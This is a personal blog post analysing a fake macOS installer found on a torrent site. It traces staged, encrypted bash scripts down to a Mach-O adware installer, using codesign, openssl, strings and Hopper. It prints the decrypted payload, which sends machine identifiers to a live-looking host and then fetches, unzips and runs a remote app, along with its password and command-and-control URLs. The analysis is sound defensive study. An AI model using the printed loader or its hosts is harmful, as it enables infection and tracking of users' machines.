---
layout: post
date: 2019-06-17
title: Malware analysis on macOS
---

I didn't even know there was malware for macOS out there. And yet, today I ran into some. I mean, I didn't manage to get my system infected or anything, but I was still quite surprised. In about 10 years of using macOS (and also Linux), I haven't ever seen any malware. That's probably due to things like the App Store, package managers, code signing and all the other neat things that Linux Distributions and Apple to do keep us safe (and lately, also Microsoft).

So, here's the story: I have this old 2010 Mac Mini that I still use for a couple of things. It has a lot of storage attached to it that I use as fileserver, to cache some things and to dump backups onto. It's not exactly the newest machine, but it's still kind of neat and handles plenty well for the things I use it for. 

I took the little thing apart and popped in an SSD. Yes, it's a bit embarassing, but until now, the thing only had a slow HDD in it, and that combined with Apple's built-in FileVault full-disk encryption meant that boots wouldn't be as swift as on modern machines. Luckily, with an SSD, the old machine feels just as snappy as she did back in the day.

So I needed to get an installer for macOS 10.13.6 High Sierra, the last version of macOS still supported by the Mac Mini. That is technically easy, because you can just download it from the App Store using this [link](https://itunes.apple.com/de/app/macos-high-sierra/id1246284741?mt=12). But it would be a lot faster if I just found a torrent for it...

Well, I did manage to find a website that offered to download macOS High Sierra 10.13.6, exactly what I was looking for. And so I downloaded it. But there was something immediately phony about the download: it was only ~500 kB. Normally, an installation image should be around 6 GB in size. That definitely got me curious. What did I just download? What would this thing do?

![Phony website hosting malware](/assets/images/mac-torrents-malware.png)

When the download finished, I knew this can't be right. The thing it downloaded is only about 500 kB. A macOS installer should be somewhere around 5 GB in size. So, something's fishy here. I did some testing. You see, the URL I got looks something like this: 

    http://cdndownloadjspr.com/dl/?z=6120&name=macOS%20High%20Sierra%2010.13.6%20-17G65-&file=https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent

Now, interestingly, you can see that this is a CDN link, and that there is a URL embedded in it. If you download that URL, you actually get a torrent file:

    $ wget "https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent"
    $ sha256sum macOS_10.13.6_High_Sierra.torrent
    fa1514a3a009471621db9986abd1e6df44bb9d7383f1be4e0b4ab628ae0f01db  macOS_10.13.6_High_Sierra.torrent
    $ torrentcheck -t *.torrent
    Torrent file  : macOS_10.13.6_High_Sierra.torrent
    Metadata info : 50614 bytes, 2488 pieces, 2097152 bytes per piece
    Torrent name  : macOS_10.13.6_High_Sierra.rar
    Content info  : single file, 5217375346 bytes
    Announce URL  : udp://tracker.leechers-paradise.org:6969

Those 5217375346 bytes that it reports is about 4.8 GB, which does check out. It might not be authentic, so I wouldn't trust it, but it does seem more likely to actually be something.

If you don't extract that URL, and use the URL of the CDN, then all bets are off. Every time you download it, you get something different.

    $ sha256sum *
    829500e88bd4b19b0f3562eba6a00f0065379b354ac408b79685ca9fe25aa064  macOS High Sierra 10.13.6 -17G65--2.dmg
    8e85ebf5b34fa8285d182602dbad02dfe91cf0f6f68e87e86796a6090c2092d9  macOS High Sierra 10.13.6 -17G65--3.dmg
    9dfc172e9f09a27af6ea9b95d434482502d602c393718f27ffe97d7e26e58eb9  macOS High Sierra 10.13.6 -17G65--4.dmg
    ddcf71302cac7ef9fd80ce754a8c1b138534dfd7bf13a728091014960422a836  macOS High Sierra 10.13.6 -17G65--5.dmg
    2bbf214ee6f289e6e93970cc46562e93fdf7236b5c55c0c1b6e0f2151d57e04f  macOS High Sierra 10.13.6 -17G65-.dmg
    c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macOS_10.13.6_High_Sierra.dmg
    cc716c1da4be1d03130b59453b5f8f668c07b96cf1a1fde0f0b920c952133428  macOS_10_13_6_High_Sierra.dmg
    faf600fd75c8aafe3dd1a0c12e4970003f771d707e4bfd0226a7fc5da2f21423  macOS_High_Sierra.dmg
    c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macos_installer_malware.dmg
    8cd90a110eabaa7dd51d912bfb6fc896ed4c002b83e992c7822a71649f3b4911  malware.dmg

That's kind of funky. I would guess they do this on purpose, possibly to avoid detection. So, next I decided to look at one of these. 

![Malware installer](/assets/images/malware-installer.png)

So, these are all perfectly valid DiskImage files, meaning that they can be mounted. They are also all either 500 kB or 1.5 MB in size, which suggests that there are different versions or different payloads here. Some of them don't have an "Installer" but a "Player" icon that looks like the Adobe Flash Player that is now obsolete but used to be quite important on the internet.

The nice thing about macOS is that it won't normally run code unless it's signed. So, we can check if this code is signed, and if it is, it'll tell us who signed it. 

    $ codesign -dvv Installer.app/
    Executable=/Volumes/Installer/Installer.app/Contents/MacOS/lkyuqiwjiavtbfmjckxz
    Identifier=com.lkyuqiwjiavtbfmjckxz
    Format=app bundle with generic
    CodeDirectory v=20200 size=216 flags=0x0(none) hashes=1+3 location=embedded
    Signature size=9014
    Authority=Developer ID Application: Edward Furlhoper (XL8ZVTY2W2)
    Authority=Developer ID Certification Authority
    Authority=Apple Root CA
    Timestamp=10. Jun 2019 at 12:29:18
    Info.plist entries=12
    TeamIdentifier=XL8ZVTY2W2
    Sealed Resources version=2 rules=13 files=2
    Internal requirements count=2 size=236

So, this app is indeed signed. It has the nonsensical identifier `com.lkyuqiwjiavtbfmjckxz`, and is signed by Edward Furlhoper. A simple search shows that this name is [not unknown](https://blog.cyberbyte.org/blog/new-macos-malware-with-command-control-capabilities-disguised-as-cill-tab-adware/), and this particular individual has been linked to other malware.

But that still doesn't tell us what this thing actually does. To find that out, we need to actually inspect the code that it is running. So, I just na√Øvely opened it in `vim`, and well, hello there..

![Malware bash script](/assets/images/malware-vim.png)

Turns out it's just a `bash` script. That's interesting, I guess I would have expected something.. sophisticated. But it does make sense, if you're going to write malware for a system, you want to do it as cheaply as possible, so you'll use whatever comes preinstalled. And writing a little bash script works because macOS comes with `bash` and `openssl` preinstalled. But what does this thing even do?

You can see that it finds the parent directory of the directory where it's stored in (it's in `Installer.app/Contents/MacOS/`, so `fileDir` will contain `Installer.app/Contents`). It then Loads a file, `Installer.app/Contents/Resources/enc`, which it decrypts and evaluates. To see what it's evaluating there, we can just decrypt that file as well and inspect it.

    $ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2822812613 < Installer.app/Contents/Resources/enc > ~/malware.sh
    $ sha256sum ~/malware.sh
    7b05f80cd95d5aa2c84a47f59e26cf2f5faf8b84661a06f0e8c5cc3094b215ee  /Users/pelsen/malware.sh

This is, again, nothing more than a simple, albeit obfuscated, bash script.

![Malware decrypted script](/assets/images/malware-decrypted.png)

This code is obfuscated, but in such a trivial way that we can easily decode it. Very obvious are the two variables, `_y` and `_t`. These are a key and some data. The functions `_m` and `_l` use these variables to decrypt something, probably a third bash script, which is then evaluated.

I went through the code to deobfuscate it, sprinkle some comments into it and I was able to learn some things on the way. For example, `${#1}` is `bash` syntax for getting the length of the string variable `$1`. 

![Malware deobfuscated](/assets/images/malware-deobfuscated.png)

This is a very classic example of a `XOR` encryption. It's pretty shit, nothing you would ever actually use, because it's very easy to crack. But malware authors aren't brainiacs, and this type of thing is interesting to implement, so why not. It does look a lot more weird than a simple call to `openssl`.

Now that we know what it does, we could go through it and follow the code to manually do what it does,to decrypt the data. Or, we can just change the `eval` into an `echo` and run the script, and let it decode itself. Note that this is sometimes dangerous, because if you made a mistake, you could inadvertendly infect your system with malware. So, it's probably best to do this in a container or a throwaway VM.

    $ docker run -it ubuntu /bin/bash
    # adduser user
    # su user
    $ chmod +x macos_malware_deobfuscated.sh
    $ ./macos_malware_deobfuscated.sh
    ...

So, running all that, we get the actual payload of the malware. This time, it isn't even obfuscated. It seems like they didn't really try to hide the fact that it's malware.

![MacOS malware payload](/assets/images/macos-malware-payload.png)

This looks like it's getting somewhere fun. Interestingly, the password is still the same, they used `2822812613` as the password at every stage. We can go through these variables they are setting, to find out what kind of information is passed on to their server, and download whatever their server gives us.

The first couple variables are just some parameters. The encryption password, which might be used to identify this particular version of the malware, or it might even be generated randomly and be able to track an individual machine. 

    ENC_PASS="2822812613"
    APP_DOMAIN="www.evyet.pw"
    APP_ROUTE="download/dlst"
    unzip_password="316218228228228126133456789"

Next are some data about the OS. That includes the version of macOS you are using, in my case that would be either 10.14.5 or 10.13.6, depending on which machine. Next is a UUID, which is just a random generated ID. The last bit is interesting, that's the IOPlatformUUID, which according to Stack Overflow seems to be some kind of [unique identifier](https://stackoverflow.com/questions/5498968/how-to-get-ioplatformuuid-on-os-x-10-4) for Apple devices. I have censored mine because I'm not sure if it should be public or not, but it has the same format as a UUID.

    $ sw_vers -productVersion
    10.14.5
    $ uuidgen
    769F2AAE-47D3-4EF4-BB6E-64B6742F3662
    $ ioreg -rd1 ioreg -rd1 -c IOPlatformExpertDevice | grep -o '"IOPlatformUUID" = "\(.*\)"'
    XXXXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXX

Next comes the interesting part. Here we actually download and execute whatever the server gives us.

```bash
url="http://${APP_DOMAIN}/${APP_ROUTE}?mid=${machine_id}&s=${session_guid}&o=${os_version}&p=${ENC_PASS}"
tmp_path="$(mktemp /tmp/XXXXXXXXX)"
curl -f0L "${url}" >/dev/null 2>&1 >> ${tmp_path} 
app_dir="$(mktemp -d /tmp/XXXXXXXX)/" 
unzip -P "${unzip_password}" "${tmp_path}" -d "${app_dir}" > /dev/null 2>&1 
rm -f ${tmp_path} 
file_name="$(grep -m1 -v "*.app" <(ls -1 "${app_dir}"))" 
volume_name="$(echo -n "${PWD}" | sed -E -n 's@^(/Volumes/[^/]+)/.*@\1@p')" 
volume_name="${volume_name// /%20}" 
chmod +x "${app_dir}${file_name}/Contents/MacOS"/* 
open -a "${app_dir}${file_name}" --args "s" "${session_guid}" "${volume_name}"
```

Note that they pass the data on to the server as GET parameters. They make a temporary dir, download something to that with `curl`, forcing HTTP 1.0 and a silent failure. Next they unzip it with the password, remove the downloaded file, and eventually launch it. Can we see what's going on here? Hell yeah we can.

So, I ended up just hardcoding some values into the script, and running it in a secure Linux container. Just to be safe. Interestingly, every time I run the script, it gives a different ZIP file. 

    f47b360433f1f696c7d0edc0dcd274562d200baa36ff479b148eab5296684cbe  run1.zip
    149f43daef9c4ac9ee17ffa108b392aa86fb230e128c6612583d52f47ea91af7  run2.zip
    add0beb0535945ab85d3ffda97248975d8dff2ddb7560eefc19ee025f8f62b11  run3.zip

However, they all seemed to extract just fine into an `Installer.app` folder, and when comparing the different extracted versions with `diff`, it seems like they are identical.

    $ diff -r Installer.app Installer2.app

The date stamp on the files is June 10th, which is only about a week ago at the time of this writing, so it's fairly recent. There are multiple things of interest at this point. First, who signed these Apps? I would guess that it's maybe the same person that signed the earlier thing, but I'd like to check. And then, obviously: what does it do? I wonder if they still have some shitty bash scripts or if this thing is actually compiled, which would be a good excuse to get out a disassembler. 

I zipped the `Installer.app` up, copied it out of the docker container and onto my Mac Mini, where I extracted it again and checked what the signature would be.

    Brutus:malware pelsen$ codesign -dvv Installer.app/
    Executable=/private/tmp/malware/Installer.app/Contents/MacOS/Installer
    Identifier=com.inst
    Format=app bundle with Mach-O thin (x86_64)
    CodeDirectory v=20200 size=1256 flags=0x0(none) hashes=32+5 location=embedded
    Signature size=4705
    Authority=Developer ID Application: Edward Furlhoper (XL8ZVTY2W2)
    Authority=Developer ID Certification Authority
    Authority=Apple Root CA
    Info.plist entries=24
    TeamIdentifier=XL8ZVTY2W2
    Sealed Resources version=2 rules=13 files=12
    Internal requirements count=1 size=200

Not overly surprising here, it's signed by the same Edward Furlhoper as the previous App. I wonder if Apple has or will blacklist this certificate, but I don't want to test it by launching this App. 

Next, let's go back to the container and inspect the code. It is interesting that the code seems to contain some GUI, because you can see some `.nib` files in the App. The executable isn't very big, it's merely 150 kB of code.

    $ ls -lh Installer.app/Contents/MacOS/
    total 304
    -rwxrwxr-x  1 pelsen  staff   148K Jun 10 12:04 Installer

At this point, there are multiple methods to reverse engineer this thing. The simple method would be to launch a macOS VM, and execute the malware in there. There are some facilities for tracing executables with `dtrace`, such as `dtruss` that let one capture all system calls an executable performs. 

The other possibility is to disassemble the executable. This is a bit more involved, might be more complicated but might also give us more information. First we can do a bit of static analysis on the code.

    $ strings Installer.app/Contents/MacOS/Installer
    class
    alloc
    init
    setRunningInstallCount:
    defaultCenter
    mainQueue
    ...

Strings shows us any ASCII-character strings embedded in the binary file. There are some interesting ones that refer to, perhaps unsurprisingly, an installer. 

    INSTALLER_authorize
    INSTALLER_installOffer:
    performSelectorOnMainThread:withObject:waitUntilDone:
    INSTALLER_downloadOffer:path:
    INSTALLER_runExternalApplication:args:
    INSTALLER_postInstall:
    INSTALLER_runScript:

This app looks like it might be an actual installer to install something. The question is, what might it install, and where would it get that from? Seeing that the binary is quite small, it seems plausible that it could download things from the internet to install. These are some symbols (functions) defined in the binary that would point in that direction:

    sendSynchronousRequest:returningResponse:error:
	INSTALLER_getDownURLParams
	openURL:
	INSTALLER_getPostURL
	INSTALLER_getDownloadHashId
	INSTALLER_downloadFileToPath:path:

Additionally, looking through the strings we can find something that appears to be Base85 encoded data, which might be something interesting. There is quite a lot in there, might be worth decoding all of them.

	TRYEGVo6BAQMG1AZBkwaAQ==
	TRYEGVoYAQ0HD1sGCg==
	TRYEGVoZAQ0HD1sGCg==
	ChYdGU9aTQsCAx0BEEwQBgcBC0wZHlocEU0eDBcDXQYADUg=
	ChYdGU9aTQsCAx0BEEwQBgcBC0wZHlocEU0eDBcDCwceVhEcBl8=
	ChYdGU9aTQsCAx0BEEwQBgcBC0wZHlocEU0ODR0cBl0NABFI

It also contains some interesting strings that sound like they might belong to some control server, and `/bin/sh` which is indicative of opening a shell or launching some script.

	/bin/sh
	http://ddse3e.space/kl/njdhu?dd=[DHIS]
	/Volumes/Installer/
	control
	goodbye
	/etc/hosts

With all of these clues, we have enough evidence that it might be useful to actually load up a disassembler and play Sherlock Holmes. But first, I wanted to check out what those base64-encoded strings are, so I extracted all of them from the `strings` output into a file, and used a little bash one-liner to decode all of them.

    $ for line in $(< strings.txt); do echo $line; echo $line | base64 -D | xxd; done
    TRIFCBYQEUwaGBkcFgc=
    00000000: 4d12 0508 1610 114c 1a18 191c 1607       M......L......
    NgcbBBwbAw4=
    00000000: 3607 1b04 1c1b 030e                      6.......
    NQsbDAYdAxACRxQFEg==
    00000000: 350b 1b0c 061d 0310 0247 1405 12         5........G...
    ...

However, most of them didn't look like anything useful. Could be some x86 bytecode, but judging by the rest of this malware, I somehow don't think they would do that. However, there is one part that looks like it could be interesting. Just to be sure, I extracted all of them so I could use `binwalk` to check if they are anything interesting.

    $ mkdir unpacked
    $ for line in $(< strings.txt); do echo $line; echo $line | base64 -D > unpacked/$line; done
    $ binwalk unpacked/*
    Scan Time:     2019-06-18 01:48:27
    Target File:   /Users/pelsen/Projects/Playground/malware/installer/unpacked/AQ0ERxQFEg4MRxgQFgMNCAEUW
    AkkLTwBBw8+ARAHByQbBhgG
    MD5 Checksum:  06a9e3f32332ad79e338c581822a6df5
    Signatures:    344

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    
    ...

However, none of these had any interesting header or anything. The only two interesting ones are also the longest strings, and they decode to some long characters:

    TT^[0F'UD/CM&O\XA0O ]QBXRTPPL3P#^-BB='^P46VZZDB6$TD\AEWOP,00O#Z+63$UY\C7R=[QBL'V^*XEZ![D@CTZDQD1RO,^GEU!Y[1BZ[6\D0'S**0XT!ZYX@ST[DMAU[D]D3 !(,@7#RY67DSW(XG3OT-ZMXWU,[XLV!*D30W#-_B6QUQ[*7# X,1F#OQ[33OW_YMX#W-,X1SVQP06QS([F*VR\YM7PUD\FD O\(6DO \-4X& **L4&UY[ML=W_]1DU _D@0T[DPL1RO[_BFOVZZDCV&(]@AQ=_Y31#SP-X0UVQD@B!SDQCD'O_]LFSR-ZA7'$6]E6QW[[0X$ Q,X@U[(D4DRRD,EM!$QYDBZ [6BATQQ[B0OR((CXWP,YX7'#_DFGV[,+6C#Z[]*FTZ(\16[O-(3LOWX^6X  (*XF!QY,6GTR(QF*SR]_07'QD(C4 O\/MMO[Z\7XV#-*4LSPY_0F=[++0@ U]DA7!ZD\B0TOPZC3OU^/@0 WQY6C'=\_A1 Z]\XDRRYDF4T&D_0F OQ]AL!T--1EQ!6[FMU$-[3X!VZ-X@S!YDL3Z!DPEGVUQ(03!ZY

    TZYYEA[!D]4@VO]]DBO Q]AXV!P(7ES!+[DA=W_]10!Z/D1DT$DZC0TOP]@3OP*_A0'Z[,0L#=QYGMQ$+QX4QPZD@MQ'D(DG$O[]3C#T_\BBT[6\@4&'PZEXW$-/X@'!]DMAP[DX@CVR_QA6VZP6FB'Z\QDDO ,^GXW$-YXL&Z/D0A[#,ZAETS^,*6&UZXEM#OQ]DEOW*(LX[W--X1PR_+GB'R_YF*[W^\40&!DZ37QO\(MBO[\,1XR$([GFPZZQ63

I would have guessed that these could be base85 encoded, however there don't seem to any lowercase characters. As we remember from how this code is launched, it gets some parameters, including a password, as parameter. It is possible that some of these things are decrypted with the amateurish "encryption", if you can even call it that, as they used in the bash scripts. 

At this point I should probably mention that this is the first time I'm doing anything like this, reverse engineering something. I am vaguely familiar with x86 assembly and Objective-C. I might fall into some beginner's traps or do something stupid. But we're on this journey here to learn, and that sometimes includes making dumb mistakes.

So I went ahead and fired up Hopper, a nice disassembler for macOS and Linux. This helps a lot, Hopper gives me a lot more information, but it takes some time to get familiar with it. 

![Hopper disassembler with malware loaded](/assets/images/malware-disassembler.png)

First I just jumped through the whole binary, trying to get an overview of what things I might find in it. There were some interesting things, all of the strings we found are embedded, and there are also some strange method names that look like obfuscation attempts:

    [ltst shLt]
    [ltst ghfyrtbv]
    [ltst trToEn:]
    [ltst trMeNw:]
    [apes KKerwerwWQ]
    [apes reuwqwer3]

We'll get to these later, and we'll find out what they do. Since I don't really know how this binary works, I started by following the code from the top, that is, from something that looks like a main function, which was actually the first function in the binary, `[InstallerOffers INSTALLER_startSetup:]`. Now, because I'm not that great at reading assembly, I just asked Hopper to give me some pseudocode. The code that it generates is actually surprisingly readable for this.

![Malware startSetup function pseudo code](/assets/images/malware-startsetup-disassembled.png){:width="50%"}

You can see how at the end it just calls the `INSTALLER_getOffers` method. By doing this repeatedly, looking at the pseudocode and figuring out what is called, I managed to slowly make my way through the whole binary, following functions around. Not particularily hard, since the binary is tiny and only has a handful of functions. 

But we'll get back to these laters.




The whole code of this, including the deobfuscated version, is available [here](https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99), if you want to inspect it.





Downloads usually come as .dmg files on macOS, these are disk images, a remnant from the time where software was distributed in the form of physical disks. These are compressed and contain a small file system, that you can mount. So I did.

Unsurprisingly, I found a small installer inside. I do think that some people would be dumb enough to just launch it, withouth checking what it does, but that's not what I was planning to do. This being macOS malware, which is basically fruitless, I was quite sure that this was written by some kid. It might actually do something, but it's probably nothing advanced. So I went ahead, opened Terminal.app, and checked what's in there.

A bash script. How interesting. I mean, it's quite obvious, if you're writing malware for a platform, you'd probably want to do it as simple as possible, and use the things that are preinstalled. And macOS happens to come with `bash` and `openssl`, so they used that.
